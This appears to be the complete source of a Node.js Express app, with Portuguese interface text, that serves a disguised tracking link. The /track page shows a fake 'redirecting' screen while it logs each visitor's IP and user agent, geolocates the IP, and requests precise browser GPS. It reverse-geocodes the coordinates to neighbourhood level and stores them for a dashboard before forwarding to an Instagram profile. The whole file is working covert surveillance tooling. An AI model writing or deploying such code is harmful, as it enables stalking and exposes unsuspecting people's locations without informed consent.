const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const clicks = [];

function getIP(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
         req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress;
  
  return ip.replace('::ffff:', '').trim();
}

function getUserAgent(req) {
  return req.headers['user-agent'] || 'Desconhecido';
}

// Dashboard principal
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Dashboard GPS Tracker</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          min-height: 100vh;
          padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
          background: white;
          border-radius: 15px;
          padding: 30px;
          margin-bottom: 20px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #667eea; margin-bottom: 10px; }
        .stats {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 20px;
        }
        .stat-card {
          background: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 5px 15px rgba(0,0,0,0.1);
          text-align: center;
        }
        .stat-number { font-size: 2.5em; font-weight: bold; color: #667eea; }
        .stat-label { color: #666; margin-top: 5px; }
        .clicks-container {
          background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .click-item {
          background: #f8f9fa;
          border-left: 4px solid #ffc107;
          padding: 15px;
          margin-bottom: 15px;
          border-radius: 5px;
        }
        .click-item.gps-enabled {
          border-left-color: #28a745;
          background: #f0fff4;
        }
        .click-time { font-weight: bold; color: #667eea; margin-bottom: 8px; }
        .click-info { color: #666; font-size: 0.9em; margin: 3px 0; }
        .gps-badge {
          background: #28a745;
          color: white;
          padding: 6px 12px;
          border-radius: 5px;
          display: inline-block;
          margin: 8px 0;
          font-weight: bold;
          font-size: 0.85em;
        }
        .ip-badge {
          background: #ffc107;
          color: #000;
          padding: 6px 12px;
          border-radius: 5px;
          display: inline-block;
          margin: 8px 0;
          font-weight: bold;
          font-size: 0.85em;
        }
        .btn {
          background: #667eea;
          color: white;
          border: none;
          padding: 12px 30px;
          border-radius: 25px;
          cursor: pointer;
          font-size: 1em;
          margin: 5px;
        }
        .btn:hover { background: #5568d3; }
        .link-box {
          background: #e3f2fd;
          padding: 15px;
          border-radius: 8px;
          margin-top: 15px;
          border: 2px dashed #667eea;
        }
        .link-box code {
          background: white;
          padding: 8px 15px;
          border-radius: 5px;
          display: inline-block;
          color: #667eea;
          font-weight: bold;
          word-break: break-all;
        }
        .location-detail {
          background: #fff;
          padding: 12px;
          margin: 8px 0;
          border-radius: 5px;
          border: 1px solid #e0e0e0;
        }
        .location-detail strong {
          color: #667eea;
        }
        .map-link {
          display: inline-block;
          margin-top: 8px;
          color: #667eea;
          text-decoration: none;
          font-weight: bold;
        }
        .map-link:hover {
          text-decoration: underline;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <div class="header">
          <h1>📊 Dashboard de Rastreamento GPS</h1>
          <p>Monitore quem clica no seu link com localização precisa</p>
          <div class="link-box">
            <strong>🔗 Seu link de rastreamento:</strong><br>
            <code id="trackingLink">Carregando...</code>
            <button class="btn" onclick="copyLink()">📋 Copiar</button>
          </div>
        </div>
        
        <div class="stats">
          <div class="stat-card">
            <div class="stat-number" id="totalClicks">0</div>
            <div class="stat-label">Total de Cliques</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="gpsClicks">0</div>
            <div class="stat-label">Com GPS Preciso</div>
          </div>
          <div class="stat-card">
            <div class="stat-number" id="ipClicks">0</div>
            <div class="stat-label">Localização por IP</div>
          </div>
        </div>
        
        <div class="clicks-container">
          <button class="btn" onclick="loadData()">🔄 Atualizar</button>
          <button class="btn" onclick="clearClicks()" style="background:#dc3545;">🗑️ Limpar Tudo</button>
          <h2 style="margin-top:20px;">Últimos Cliques</h2>
          <div id="clicksList">Carregando...</div>
        </div>
      </div>
      
      <script>
        const trackingUrl = window.location.origin + '/track';
        document.getElementById('trackingLink').textContent = trackingUrl;
        
        function copyLink() {
          navigator.clipboard.writeText(trackingUrl);
          alert('Link copiado!');
        }
        
        async function clearClicks() {
          if (confirm('Tem certeza que deseja limpar todos os cliques?')) {
            await fetch('/api/clear', { method: 'POST' });
            loadData();
          }
        }
        
        async function loadData() {
          try {
            const res = await fetch('/api/stats');
            const data = await res.json();
            
            document.getElementById('totalClicks').textContent = data.total;
            
            const gpsClicks = data.clicks.filter(c => c.gpsLocation);
            const ipClicks = data.clicks.filter(c => !c.gpsLocation && c.ipLocation);
            
            document.getElementById('gpsClicks').textContent = gpsClicks.length;
            document.getElementById('ipClicks').textContent = ipClicks.length;
            
            const container = document.getElementById('clicksList');
            
            if (data.clicks.length === 0) {
              container.innerHTML = '<p style="text-align:center;color:#999;padding:40px;">🔭 Nenhum clique registrado ainda</p>';
              return;
            }
            
            container.innerHTML = data.clicks.map(c => {
              const date = new Date(c.timestamp).toLocaleString('pt-BR');
              const hasGPS = c.gpsLocation && c.gpsLocation.cidade;
              const hasIP = c.ipLocation && c.ipLocation.cidade;
              const itemClass = hasGPS ? 'click-item gps-enabled' : 'click-item';
              
              let locationHTML = '';
              
              if (hasGPS) {
                const loc = c.gpsLocation;
                locationHTML = \`
                  <div class="gps-badge">✅ LOCALIZAÇÃO GPS PRECISA</div>
                  <div class="location-detail">
                    <strong>🏙️ Cidade:</strong> \${loc.cidade}<br>
                    <strong>🗺️ Estado:</strong> \${loc.estado}<br>
                    <strong>🏘️ Bairro:</strong> \${loc.bairro || 'N/A'}<br>
                    <strong>🌎 País:</strong> \${loc.pais || 'Brasil'}<br>
                    <strong>📍 Coordenadas:</strong> \${loc.lat.toFixed(6)}, \${loc.lng.toFixed(6)}<br>
                    <strong>🎯 Precisão:</strong> \${loc.accuracy ? Math.round(loc.accuracy) + 'm' : 'N/A'}<br>
                    <a class="map-link" href="https://www.google.com/maps?q=\${loc.lat},\${loc.lng}" target="_blank">🗺️ Ver no Google Maps</a>
                  </div>
                \`;
              } else if (hasIP) {
                const loc = c.ipLocation;
                locationHTML = \`
                  <div class="ip-badge">⚠️ LOCALIZAÇÃO POR IP (MENOS PRECISA)</div>
                  <div class="location-detail">
                    <strong>🏙️ Cidade:</strong> \${loc.cidade}<br>
                    <strong>🗺️ Estado:</strong> \${loc.estado}<br>
                    <strong>🌎 País:</strong> \${loc.pais || 'Brasil'}
                  </div>
                  <p style="font-size:0.85em;color:#999;margin-top:8px;">ℹ️ GPS não autorizado pelo usuário - localização baseada no endereço IP</p>
                \`;
              } else {
                locationHTML = '<div class="ip-badge">❌ LOCALIZAÇÃO NÃO DISPONÍVEL</div>';
              }
              
              return \`
                <div class="\${itemClass}">
                  <div class="click-time">⏰ Data/Hora: \${date}</div>
                  <div class="click-info">🌐 IP: \${c.ip}</div>
                  <div class="click-info">📱 Dispositivo: \${c.userAgent || 'Desconhecido'}</div>
                  <div class="click-info">🔍 User Agent: \${c.fullUserAgent ? c.fullUserAgent.substring(0, 80) + '...' : 'N/A'}</div>
                  \${locationHTML}
                </div>
              \`;
            }).join('');
            
          } catch (error) {
            console.error('Erro ao carregar dados:', error);
          }
        }
        
        loadData();
        setInterval(loadData, 5000);
      </script>
    </body>
    </html>
  `);
});

// Página de rastreamento com GPS
app.get('/track', async (req, res) => {
  const clickData = {
    id: clicks.length + 1,
    ip: getIP(req),
    timestamp: new Date().toISOString(),
    userAgent: getUserAgent(req),
    fullUserAgent: req.headers['user-agent'],
    gpsLocation: null,
    ipLocation: null
  };
  
  clicks.push(clickData);
  console.log('🔔 Novo clique ID:', clickData.id, 'IP:', clickData.ip);
  
  // Busca localização por IP em background
  (async () => {
    try {
      const ipClean = clickData.ip;
      
      if (ipClean === '127.0.0.1' || ipClean === 'localhost' || ipClean.startsWith('192.168.')) {
        console.log('⚠️  IP local detectado');
        return;
      }
      
      const response = await fetch(\`http://ip-api.com/json/\${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon,district\`);
      const ipData = await response.json();
      
      if (ipData.status === 'success') {
        const click = clicks.find(c => c.id === clickData.id);
        if (click && !click.gpsLocation) {
          click.ipLocation = {
            cidade: ipData.city || 'N/A',
            estado: ipData.regionName || 'N/A',
            pais: ipData.country || 'N/A',
            bairro: ipData.district || 'N/A'
          };
          console.log('📍 IP Location:', ipData.city, ipData.regionName);
        }
      }
    } catch (error) {
      console.error('❌ Erro na geolocalização por IP:', error.message);
    }
  })();
  
  res.send(\`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Redirecionando...</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .container {
          text-align: center;
          background: white;
          padding: 40px;
          border-radius: 20px;
          box-shadow: 0 10px 50px rgba(0,0,0,0.3);
          max-width: 400px;
        }
        .loader {
          border: 5px solid #f3f3f3;
          border-top: 5px solid #667eea;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
          margin: 20px auto;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        h2 { color: #667eea; margin-bottom: 10px; }
        p { color: #666; font-size: 14px; }
        #status { 
          color: #28a745; 
          font-weight: bold; 
          margin-top: 10px;
          font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>🔄 Redirecionando...</h2>
        <div class="loader"></div>
        <p>Aguarde um momento...</p>
        <p id="status">Obtendo localização...</p>
      </div>
      
      <script>
        const clickId = \${clickData.id};
        const INSTAGRAM_URL = 'https://www.instagram.com/andre.osantos12/';
        const MAX_WAIT_TIME = 8000; // 8 segundos máximo
        
        let redirected = false;
        
        function safeRedirect() {
          if (!redirected) {
            redirected = true;
            window.location.href = INSTAGRAM_URL;
          }
        }
        
        // Timeout de segurança
        setTimeout(() => {
          document.getElementById('status').textContent = 'Redirecionando...';
          safeRedirect();
        }, MAX_WAIT_TIME);
        
        async function reverseGeocode(lat, lon) {
          try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(
              \\\`https://nominatim.openstreetmap.org/reverse?format=json&lat=\\\${lat}&lon=\\\${lon}&addressdetails=1&accept-language=pt-BR\\\`,
              { 
                signal: controller.signal,
                headers: { 
                  'User-Agent': 'InstagramTracker/1.0',
                  'Accept': 'application/json'
                } 
              }
            );
            
            clearTimeout(timeoutId);
            
            if (!response.ok) {
              throw new Error('Erro na API');
            }
            
            const data = await response.json();
            
            if (data && data.address) {
              const addr = data.address;
              return {
                cidade: addr.city || addr.town || addr.village || addr.municipality || addr.county || 'Desconhecida',
                estado: addr.state || addr.region || 'Desconhecido',
                bairro: addr.suburb || addr.neighbourhood || addr.district || addr.quarter || null,
                pais: addr.country || 'Brasil'
              };
            }
            
            return null;
          } catch (error) {
            console.error('Erro no geocoding:', error);
            return null;
          }
        }
        
        async function getLocationAndRedirect() {
          if (!navigator.geolocation) {
            console.log('Geolocalização não suportada');
            safeRedirect();
            return;
          }
          
          document.getElementById('status').textContent = 'Obtendo GPS...';
          
          navigator.geolocation.getCurrentPosition(
            async (position) => {
              try {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                
                console.log('✅ GPS obtido:', lat, lng, 'Precisão:', accuracy, 'm');
                document.getElementById('status').textContent = 'GPS obtido! Buscando endereço...';
                
                // Busca o endereço
                const location = await reverseGeocode(lat, lng);
                
                if (location) {
                  console.log('✅ Endereço obtido:', location.cidade, location.estado);
                  document.getElementById('status').textContent = 'Salvando localização...';
                }
                
                // Envia para o servidor
                const response = await fetch('/api/save-gps', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    clickId: clickId,
                    lat: lat,
                    lng: lng,
                    accuracy: accuracy,
                    location: location
                  })
                });
                
                const result = await response.json();
                console.log('✅ Resultado:', result);
                
                if (result.success) {
                  document.getElementById('status').textContent = 'Localização salva! Redirecionando...';
                  setTimeout(safeRedirect, 500);
                } else {
                  console.error('Erro ao salvar:', result.error);
                  safeRedirect();
                }
                
              } catch (error) {
                console.error('Erro ao processar GPS:', error);
                safeRedirect();
              }
            },
            (error) => {
              console.log('❌ Erro GPS:', error.code, error.message);
              document.getElementById('status').textContent = 'GPS não autorizado. Redirecionando...';
              setTimeout(safeRedirect, 1000);
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        }
        
        // Executa automaticamente
        getLocationAndRedirect();
      </script>
    </body>
    </html>
  \`);
});

// Salvar GPS
app.post('/api/save-gps', async (req, res) => {
  try {
    const { clickId, lat, lng, accuracy, location } = req.body;
    
    console.log('📥 Recebendo GPS para click', clickId);
    
    const click = clicks.find(c => c.id === clickId);
    if (!click) {
      console.error('❌ Click não encontrado:', clickId);
      return res.json({ success: false, error: 'Click não encontrado' });
    }
    
    // Salva a localização GPS
    click.gpsLocation = {
      lat: lat,
      lng: lng,
      accuracy: accuracy,
      cidade: location?.cidade || 'Processando...',
      estado: location?.estado || 'Processando...',
      bairro: location?.bairro || null,
      pais: location?.pais || 'Brasil'
    };
    
    console.log('✅ GPS salvo para click', clickId, ':', lat, lng);
    console.log('📍 Localização:', click.gpsLocation.cidade, click.gpsLocation.estado);
    
    // Se não veio localização do cliente, tenta buscar no servidor
    if (!location || !location.cidade || location.cidade === 'Desconhecida') {
      console.log('🔄 Buscando endereço no servidor...');
      
      try {
        const response = await fetch(
          \`https://nominatim.openstreetmap.org/reverse?format=json&lat=\${lat}&lon=\${lng}&addressdetails=1&accept-language=pt-BR\`,
          { 
            headers: { 
              'User-Agent': 'InstagramTracker/1.0'
            } 
          }
        );
        
        const data = await response.json();
        
        if (data && data.address) {
          const addr = data.address;
          
          click.gpsLocation.cidade = addr.city || addr.town || addr.village || addr.municipality || addr.county || 'Desconhecida';
          click.gpsLocation.estado = addr.state || addr.region || 'Desconhecido';
          click.gpsLocation.bairro = addr.suburb || addr.neighbourhood || addr.district || addr.quarter || null;
          click.gpsLocation.pais = addr.country || 'Brasil';
          
          console.log('✅ Endereço atualizado (servidor):', click.gpsLocation.cidade, click.gpsLocation.estado);
        }
      } catch (error) {
        console.error('❌ Erro ao buscar endereço no servidor:', error.message);
      }
    }
    
    res.json({ success: true, location: click.gpsLocation });
    
  } catch (error) {
    console.error('❌ Erro ao salvar GPS:', error);
    res.json({ success: false, error: error.message });
  }
});

// API de estatísticas
app.get('/api/stats', (req, res) => {
  res.json({
    total: clicks.length,
    clicks: [...clicks].reverse()
  });
});

// Limpar cliques
app.post('/api/clear', (req, res) => {
  clicks.length = 0;
  console.log('🗑️ Todos os cliques foram limpos');
  res.json({ success: true });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log('🚀 Servidor rodando na porta', PORT);
  console.log('📱 Acesse: http://localhost:' + PORT);
  console.log('');
  console.log('💡 Dica: O GPS preciso só funciona em HTTPS (produção)');
  console.log('💡 Em HTTP/localhost, a precisão é limitada');
});
